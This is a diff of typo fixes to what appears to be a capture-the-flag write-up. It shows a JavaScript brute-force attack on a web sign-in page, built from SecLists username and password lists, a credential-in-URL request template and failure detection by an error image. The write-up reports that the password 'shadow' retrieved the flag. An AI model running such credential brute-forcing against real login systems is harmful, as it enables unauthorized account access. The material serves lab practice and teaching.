@@ -28,7 +28,7 @@ We will use the following password and usernames dataset for the form inputs val
 - [usernames →](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)
 - [passwords →](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt)
 
-We will then hit the endpoint below with all the possibilites until the server returns an authenticated page.
+We will then hit the endpoint below with all the possibilities until the server returns an authenticated page.
 
 ```js
 `http://IP/?page=signin&username=${username}&password=${password}&Login=Login#`
@@ -45,7 +45,7 @@ We will then hit the endpoint below with all the possibilites until the server r
                 const renderedPage = await response.text()
                 const attemptFailed = renderedPage.includes(BAD_AUTH_ERROR_IMAGE)
 
-                // In case of wrong authentication atttemp the following image is rendered by the server
+                // In case of wrong authentication attempt the following image is rendered by the server
                 // The Status code stays 200
                 // <img src="images/WrongAnswer.gif" alt=""> 
                 if (attemptFailed) {
@@ -59,14 +59,14 @@ We will then hit the endpoint below with all the possibilites until the server r
                 }
 
             } catch (e) {
-                console.log(`Unkown error on attempt for username=${username} password=${password}`)
+                console.log(`Unknown error on attempt for username=${username} password=${password}`)
                 continue
             }
         }
     }))
 ```
 
-After running the script, it leads to a successful attempt for all the concurent users on the 95th password: `shadow`.
+After running the script, it leads to a successful attempt for all the concurrent users on the 95th password: `shadow`.
 Indeed the username is not mandatory, filling the password input with `shadow` is enough the retrieve the flag from the server.
 
 #### Log snippet
